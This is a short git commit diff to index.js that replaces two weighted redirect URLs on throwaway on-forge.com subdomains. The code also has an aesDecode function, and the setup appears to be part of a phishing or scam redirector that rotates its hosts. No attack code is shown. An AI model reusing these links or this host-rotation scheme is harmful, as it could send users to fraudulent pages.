4ac90a92a0eac3a361425c2d0123c03470251aa3
animalinside <akshay.anand12@yahoo.com>
2026-05-25 12:35:53 +0530

    Update index.js

--- index.js
+++ index.js
@@ -72,8 +72,8 @@ function aesDecode(encryptedText) {
   function getResponse() {
 
     const links = [
-        { url: "https://4-dsfhdfdfhd.on-forge.com/werrx01USAHTML/?bcda=65-3125-2955", weight: 0.5 },
-        { url: "https://4-dsfhdfdfhd.on-forge.com/werrx01USAHTML/?bcda=65-3125-2955", weight: 0.5 }
+        { url: "https://5-jsdhvsdjfds.on-forge.com/werrx01USAHTML/?bcda=65-3125-2955", weight: 0.5 },
+        { url: "https://5-jsdhvsdjfds.on-forge.com/werrx01USAHTML/?bcda=65-3125-2955", weight: 0.5 }
       
     ];
 
